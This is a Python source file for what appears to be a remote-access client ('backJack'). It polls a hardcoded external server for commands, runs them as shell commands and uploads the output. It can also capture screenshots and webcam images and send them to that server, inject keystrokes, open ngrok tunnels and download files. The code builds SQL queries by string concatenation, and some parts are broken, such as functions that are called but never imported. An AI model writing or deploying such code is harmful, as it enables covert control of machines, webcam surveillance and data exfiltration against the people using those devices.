import cv2
import json
import hashlib
import sqlite3
import pyautogui
import pytz
from mss import mss
from time import sleep
from requests import post
from os import popen, path, system, remove
from notifypy import Notify
from datetime import datetime


siteName = "http://1nvict.000webhostapp.com/backjack/"

notify = Notify()
def sendFile(nm):
    files = {'file': open(nm,'rb')}
    r = post(siteName+"upload.php", files=files, data={'usrId':md5hash(userData['userId']+"SALTlake")})
def prsKeys(wArr):
    wArr += "+"*9
    wArr = wArr.replace("cmd","winleft")
    wArr = wArr.replace("bksp","backspace")
    wArr = wArr.replace("shft","shift")
    wArr = wArr.split('+')
    pyautogui.hotkey(wArr[0],wArr[1],wArr[2],wArr[3],wArr[4],wArr[5],wArr[6],wArr[7],wArr[8],wArr[9])
def crntTime():
    td = datetime.now(pytz.timezone('Asia/Kolkata'))
    d = td.strftime("%d-%m-%Y")
    t = td.strftime("%H:%M:%S")
    return d,t
def whatIp():
    ip = popen("hostname -I | awk '{print $1}'").read()
    if(ip == "\n"):
        ip = ""
    return ip
def runNgrk(m):
    if(m == "f"):
        cmnd = "ngrok http file:///"
    elif(m == "s"):
        cmnd = "ngrok http 80"
    system(cmnd+" &")
    return "echo \"Server Started!!\""
def sndNgLink():
    try:
        system("curl  http://localhost:4040/api/tunnels > tunnels.json")
        with open('tunnels.json') as data_file:
            datajson = json.load(data_file)
        remove('tunnels.json')
        for i in datajson['tunnels']:
            link = i['public_url']
    except:
        link = "No session started yet"
    return ("echo \"lnk "+link+"\"")

def md5hash(txt):
    return (hashlib.md5(txt.encode())).hexdigest()
def getData():
    global appData
    resp = post(siteName+"authAPI.php",{'authid':appData[0],'giveInfo':''})
    userData = json.loads(str(resp.text))
    return userData
def iamconn():
    resp = post(siteName+"dataAPI.php",{'iamconn':userData['userId'],'time':crntTime()[0]+" "+crntTime()[1]})
def saveHist(cmd):
    global conn
    conn.execute("insert into cmndData (cmnd,date,time) values ('"+cmd+"','"+crntTime()[0]+"','"+crntTime()[1]+"')")
    conn.commit()
def getCommand():
    try:
        resp = post(siteName+"dataAPI.php",{'getCmnd':md5hash(userData['userId']+'SALTlake')})
        r = resp.text
        if(r != ""):
            return r
    except:
        return False
def senData(txt,id=False):
    txt = txt.replace("\n","<br>")
    if(txt.strip().replace("\n","")==""):
        txt = "---"
    if(id):
        resp = post(siteName+"dataAPI.php",{'givRepl':txt,'cmdId':md5hash(id+"SALTlake"),'usrId':md5hash(userData['userId']+"SALTlake")})
    else:
        resp = post(siteName+"dataAPI.php",{'givRepl':txt,'usrId':md5hash(userData['userId']+"SALTlake")})
def authClient():
    global conn, homePath,appData
    homePath = "/home/"+popen("whoami").read().replace("\n","")+"/.backJack"
    if(not path.exists(homePath+"/.main.db")):
        exit()
    else:
        conn = sqlite3.connect(homePath+"/.main.db")
        data = conn.execute("SELECT * FROM userData")
        for i in data:
            appData = i
        resp = post(siteName+"authAPI.php",{'authid':appData[0]})
        r = (resp.text)
        if(not r):
            for i in listdir(homePath):
                remove(homePath+'/'+i)
            rmdir(homePath)
            exit()
def shouldRun():
    global conn
    d = conn.execute("select rv from userData")
    for i in d:
        return (i[0])

def run():
    while True:
        try:
            userData = getData()
            if(shouldRun()):
                sleep(1)
                cmnd = getCommand()
                if(cmnd != None):
                    cmnd = json.loads(cmnd)
                    m = cmnd['cmnd']
                    saveHist(m)
                    if(m == "showWifi"):
                        m = "nmcli dev wifi"
                    elif(m[0:4] == "vol "):
                        m = "amixer -D pulse sset Master "+m[4:len(m)]+"%"
                    elif(m=="bat"):
                        m = "acpi"
                    elif(m[0:4] == "prs "):
                        prsKeys(m[4:len(m)])
                        m = "echo \"Pressed the following keys on the device:\n"+m[4:len(m)]+"\""
                    elif(m[0:4] == "typ "):
                        pyautogui.typewrite(m[4:len(m)],interval=0.05)
                        m = "echo \"Typed the following on the device:\n"+m[4:len(m)]+"\""
                    elif(m[0:5]=="ngrk "):
                        m = runNgrk(m[5:len(m)])
                    elif(m == "ngLink"):
                        m = sndNgLink()
                    elif(m == "ngStop"):
                        m = "killall ngrok && echo \"Session Stopped\""
                    elif(m == "stopRecv"):
                        m = "Receiver Stopped"
                        senData(m)
                        exit()
                    elif(m[0:7]=="gglchrm"):
                        system("google-chrome "+m[8:len(m)]+" &")
                    elif(m[0:4]=="img "):
                        fln = m[4:len(m)]
                        system("wget "+siteName+"uploaded_files/"+fln)
                        m="echo \"File saved with name:\n"+fln+"\""
                    elif(m[0:5] == "ntfy "):
                        detl = m[5:len(m)].split("$AND$")
                        notify.title = detl[0]
                        notify.message = detl[1]
                        notify.icon="icon.png"
                        notify.send()
                        m='echo "Notified:\n'+detl[0]+'\n'+detl[1]+'"'
                    elif(m=="scrsht"):
                        with mss() as sct:
                            sct.shot(output='screenShot.png')
                        sendFile("screenShot.png")
                        system("rm screenShot.png")
                        m="echo \"Screenshot Received\""
                    elif(m=="webcam"):
                        cam = cv2.VideoCapture(0)
                        return_value, image = cam.read()
                        cv2.imwrite('camImg.png', image)
                        cam.release()
                        sendFile("camImg.png")
                        system("rm camImg.png")
                        m="echo \"Webcam image Received\""
                    saveHist(m)
                    outp = popen(m).read()
                    senData(outp,cmnd['cmdId'])
                iamconn()
        except Exception as e:
            print(e)
            pass

while(True):
    try:
        authClient()
        userData = getData()
        senData("Device online at: "+crntTime()[0]+" "+crntTime()[1])
        print("connected to controller")
        run()
    except:
        pass
